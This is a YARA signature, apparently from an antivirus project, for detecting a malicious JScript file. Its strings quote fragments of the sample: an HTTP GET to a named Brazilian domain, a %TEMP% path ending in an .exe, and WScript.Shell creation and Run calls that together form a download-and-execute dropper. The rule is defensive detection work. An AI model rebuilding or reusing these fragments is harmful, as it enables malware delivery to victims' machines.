rule sig_20160329_a9ead0edf22147b2df8a1f1b4f222014 {
  meta:
    description = "datamaliciousorder - file 20160329_a9ead0edf22147b2df8a1f1b4f222014.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "39629de0f6aa84140f5c9471de59ea34e124f33ab89d0ccabe89fa682e7ce1fb"

  strings:
    $s1  = "w[V0](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function V() {return I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"FlOpYInGt.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ny](e() * 11); if (w[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var I = function q() {return WScript[Gy](\"WScript.Shell\");}(), F = 11;" fullword ascii
    $s5  = "function aj(KK, j0){X = X * 1; return KK - j0;};" fullword ascii
    $s6  = "function Y(){return \"\" + fZ;};" fullword ascii
    $s7  = "function G() {return ((cF == true) && (cF == kA)) ? 1 : X;};" fullword ascii
    $s8  = "function P(no){I[\"Run\"](no, X, X);};" fullword ascii
    $s9  = " while (m){" fullword ascii
    $s10 = "function i()" fullword ascii
    $s11 = "function e(){return 22;};" fullword ascii
    $s12 = "var g = new this[\"Date\"]();" fullword ascii
    $s13 = "function T(){return Gy;};" fullword ascii
    $s14 = "function qo(Cl) {var D = (1, 2, 3, 4, 5, Cl); return D;};" fullword ascii
    $s15 = "return aj(IA, vj);" fullword ascii
    $s16 = "var j = false;" fullword ascii
    $s17 = "kA = true; " fullword ascii
    $s18 = "cF = true; " fullword ascii
    $s19 = "var kA = false;" fullword ascii
    $s20 = "var cF = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}